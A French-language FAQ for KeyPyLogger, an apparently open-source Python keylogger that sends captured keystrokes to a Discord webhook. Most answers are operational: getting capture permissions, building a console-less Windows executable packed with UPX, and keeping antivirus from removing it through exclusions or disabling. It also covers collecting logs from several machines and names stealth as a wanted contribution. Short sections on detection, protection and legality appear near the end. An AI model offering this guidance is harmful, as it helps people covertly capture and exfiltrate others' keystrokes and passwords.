# ❓ FAQ - KeyPyLogger

## Questions Fréquentes

---

## Installation et Configuration

### Q: Quelle version de Python est requise ?

**R:** Python 3.7 ou supérieur. Testé avec Python 3.7 à 3.14.

### Q: Puis-je utiliser Python 2 ?

**R:** Non, Python 2 n'est plus supporté. Utilisez Python 3.7+.

### Q: Les dépendances ne s'installent pas ?

**R:**
```bash
# Essayez :
pip install --upgrade pip
pip install -r requirements.txt

# Ou installation manuelle :
pip install pynput requests pyinstaller
```

### Q: Erreur "command 'pip' not found" ?

**R:**
```bash
# Windows :
python -m pip install -r requirements.txt

# Linux :
sudo apt install python3-pip
```

---

## Utilisation

### Q: Le keylogger ne capture rien ?

**R:**

**Windows** :
- Vérifiez que Python a les permissions nécessaires
- Certaines applications (admin) bloquent la capture
- Essayez en tant qu'administrateur

**Linux** :
- Ajoutez votre user au groupe `input` : `sudo usermod -a -G input $USER`
- Ou exécutez avec `sudo`
- Vérifiez que vous êtes en environnement graphique (X11/Wayland)

### Q: Rien n'arrive sur Discord ?

**R:**

1. **Vérifiez l'URL du webhook**
   - Doit commencer par `https://discord.com/api/webhooks/`
   - Pas d'espaces ou caractères spéciaux

2. **Testez la connexion**
   ```bash
   python tools/test_webhook.py
   ```

3. **Vérifiez Discord**
   - Le webhook existe toujours ?
   - Bon canal ?
   - Pas de limite de débit ?

4. **Attendez**
   - Par défaut, envoi toutes les 60 secondes
   - Ou tapez 1000 caractères pour forcer l'envoi

### Q: Comment changer l'intervalle d'envoi ?

**R:** Éditez le fichier source :
```python
SEND_INTERVAL = 30  # 30 secondes au lieu de 60
```

### Q: Comment arrêter le keylogger ?

**R:**
- **Ctrl+C** dans le terminal
- **Windows** : `taskkill /IM python.exe /F`
- **Linux** : `pkill -f keylogger`

---

## Compilation (Windows)

### Q: L'antivirus supprime l'exécutable ?

**R:** C'est normal ! Les keyloggers sont détectés comme malware.

**Solutions** :
1. Ajouter une exception dans Windows Defender :
   - Security → Virus & threat protection → Exclusions
   - Ajouter le dossier KeyPyLogger

2. Désactiver temporairement l'antivirus (tests seulement)

3. Utiliser le script Python au lieu de l'exécutable

4. Tester dans une VM isolée

### Q: La compilation échoue ?

**R:**

```bash
# 1. Vérifier PyInstaller
pip install --upgrade pyinstaller

# 2. Vérifier que le webhook est configuré
notepad src/windows/keylogger_windows.py

# 3. Compiler manuellement
python -m PyInstaller --onefile --noconsole src/windows/keylogger_windows.py
```

### Q: L'exécutable ne fonctionne pas ?

**R:**

1. **Compiler avec console visible pour voir les erreurs** :
   ```bash
   python tools/compile_windows.py
   # Choisir option 2 (console visible)
   ```

2. **Vérifier que le webhook est dans le code source** AVANT compilation

3. **Erreur commune** : Webhook non configuré
   - L'exécutable dit "[!] ERROR: Webhook URL not configured!"
   - Solution : Configurer le webhook AVANT de compiler

### Q: L'exécutable est trop gros (15+ MB) ?

**R:** C'est normal, PyInstaller inclut Python et toutes les dépendances.

**Réduire la taille** :
```bash
# Avec UPX compression
pyinstaller --onefile --noconsole --upx-dir=/path/to/upx src/windows/keylogger_windows.py
```

---

## Linux Spécifique

### Q: "Permission denied" sur Linux ?

**R:**

**Solution 1 (Recommandée)** :
```bash
sudo usermod -a -G input $USER
# Puis déconnexion/reconnexion
```

**Solution 2** :
```bash
sudo python3 src/linux/keylogger_linux.py
```

### Q: Ça ne marche pas en SSH ?

**R:** Le keylogger nécessite un environnement graphique (X11/Wayland). En SSH, il n'y a pas de clavier graphique à capturer.

**Solution** : Utilisez une session graphique (VNC, XRDP, ou direct).

### Q: Erreur "No module named '_tkinter'" ?

**R:** Ce n'est pas nécessaire pour le keylogger. Si vous voyez cette erreur, ignorez-la ou installez :
```bash
sudo apt install python3-tk
```

---

## Détection et Sécurité

### Q: Comment détecter un keylogger ?

**R:**

**Windows** :
```powershell
# Processus suspects
tasklist | findstr python

# Connexions réseau
netstat -ano | findstr ESTABLISHED

# Fichiers récents
Get-ChildItem -Recurse -Filter *.py
```

**Linux** :
```bash
# Processus suspects
ps aux | grep python

# Connexions réseau
sudo netstat -tunap | grep python

# Fichiers récents
find / -name "*keylog*" 2>/dev/null
```

### Q: Comment se protéger contre les keyloggers ?

**R:**

1. **Antivirus à jour**
2. **Pare-feu actif**
3. **Surveiller les processus** régulièrement
4. **Ne pas exécuter de fichiers inconnus**
5. **Utiliser un gestionnaire de mots de passe** (pas de frappe clavier)
6. **Clavier virtuel** pour mots de passe sensibles
7. **Analyser le réseau** pour détecter les connexions suspectes

### Q: Est-ce détectable par les antivirus ?

**R:**

- **Script Python** : Généralement non détecté
- **Exécutable PyInstaller** : Souvent détecté comme "PUP" (Potentially Unwanted Program) ou malware générique
- **Comportemental** : Les antivirus modernes peuvent détecter le comportement de capture clavier

---

## Discord

### Q: Le webhook a été supprimé/invalidé ?

**R:** Créez-en un nouveau :
1. Discord → Serveur → Intégrations → Webhooks
2. Nouveau Webhook
3. Copier l'URL
4. Mettre à jour dans le code

### Q: Limite de débit Discord (rate limit) ?

**R:** Discord limite les webhooks :
- ~30 messages par minute
- ~1000 messages par heure

**Solution** : Augmenter `SEND_INTERVAL`
```python
SEND_INTERVAL = 120  # 2 minutes au lieu de 60 secondes
```

### Q: Les messages Discord sont tronqués ?

**R:** Discord limite les embeds à 4096 caractères.

Le keylogger tronque automatiquement à 4000 :
```python
"description": f"```\n{log_content[:4000]}\n```"
```

### Q: Comment utiliser plusieurs webhooks ?

**R:**

**Méthode 1** : Fichiers séparés
```bash
# Machine 1
WEBHOOK_URL = "webhook_machine1"

# Machine 2
WEBHOOK_URL = "webhook_machine2"
```

**Méthode 2** : Liste de webhooks (modification du code)
```python
WEBHOOKS = [
    "https://discord.com/api/webhooks/webhook1",
    "https://discord.com/api/webhooks/webhook2"
]

# Envoyer à tous
for webhook in WEBHOOKS:
    requests.post(webhook, json=payload)
```

---

## Performance

### Q: Le keylogger ralentit mon PC ?

**R:** Non, l'impact est minimal (< 1% CPU). Si c'est lent :
- Vérifiez d'autres processus
- Réduisez `SEND_INTERVAL`
- Augmentez `MAX_BUFFER_SIZE`

### Q: Consommation mémoire ?

**R:** ~20-50 MB, très faible.

### Q: Consommation réseau ?

**R:**
- Message de démarrage : ~1 KB
- Logs : ~0.5-2 KB par envoi
- Total : ~5-20 KB/heure (variable selon activité)

---

## Légal et Éthique

### Q: Est-ce légal ?

**R:**

✅ **Légal** :
- Sur VOS propres machines
- Avec autorisation ÉCRITE du propriétaire
- Contexte éducatif/recherche autorisée
- CTF et labs de sécurité

❌ **Illégal** :
- Sur machines de tiers sans permission
- Espionnage de proches/collègues
- Utilisation malveillante
- Violation de vie privée

**Consultez les lois locales avant utilisation !**

### Q: Puis-je l'utiliser au travail ?

**R:** **NON**, sauf si :
- Vous êtes l'administrateur IT
- Vous avez une autorisation ÉCRITE de la direction
- C'est pour un audit de sécurité autorisé
- Vous informez les utilisateurs (loi RGPD en UE)

### Q: Puis-je l'utiliser pour surveiller mes enfants ?

**R:** Question légale complexe, dépend du pays/région. Consultez un avocat. En général :
- ✅ Enfants mineurs sous votre responsabilité
- ❌ Sans les informer (transparence recommandée)
- Vérifiez les lois locales sur la vie privée familiale

---

## Développement

### Q: Puis-je contribuer au projet ?

**R:** Oui ! Fork → Modif → Pull Request

Idées :
- Support macOS
- Interface graphique
- Chiffrement des logs
- Amélioration de la furtivité

### Q: Comment personnaliser le keylogger ?

**R:** Éditez le code source :
- Modifier les messages Discord
- Changer les touches capturées
- Ajouter des filtres
- Modifier l'intervalle dynamiquement

### Q: Puis-je vendre ce logiciel ?

**R:** Le code est sous licence MIT, donc techniquement oui, MAIS :
- Vous devez garder l'attribution
- Usage LÉGAL obligatoire
- Responsabilité légale à vous

**Recommandation** : Ne vendez pas un keylogger, c'est éthiquement discutable.

---

## Problèmes Spécifiques

### Q: TypeError: expected string or bytes-like object ?

**R:** Problème avec pynput. Vérifiez la version :
```bash
pip install --upgrade pynput
```

### Q: ModuleNotFoundError: No module named 'pynput.keyboard' ?

**R:**
```bash
pip uninstall pynput
pip install pynput
```

### Q: Erreur "utcnow() is deprecated" ?

**R:** Ce n'est qu'un warning. Le code fonctionne. Pour le corriger :
```python
# Remplacer
datetime.utcnow()

# Par
datetime.now(timezone.utc)
```

### Q: L'exécutable dit "Webhook URL not configured" ?

**R:** Le webhook n'était pas configuré AVANT la compilation.

**Solution** :
1. Éditer `src/windows/keylogger_windows.py`
2. Mettre votre webhook (ligne 20)
3. Sauvegarder
4. Recompiler avec `python tools/compile_windows.py`

---

## Support

### Q: Où poser des questions ?

**R:**
- 📖 Lire la documentation complète
- 🐛 [GitHub Issues](https://github.com/Nyx-Off/KeyPyLogger/issues) pour bugs
- 💬 [GitHub Discussions](https://github.com/Nyx-Off/KeyPyLogger/discussions) pour questions

### Q: J'ai trouvé un bug ?

**R:** Ouvrez une issue sur GitHub avec :
- Description du problème
- Système d'exploitation
- Version de Python
- Steps pour reproduire
- Messages d'erreur

---

**Vous n'avez pas trouvé votre réponse ? → [Ouvrir une discussion](https://github.com/Nyx-Off/KeyPyLogger/discussions)**
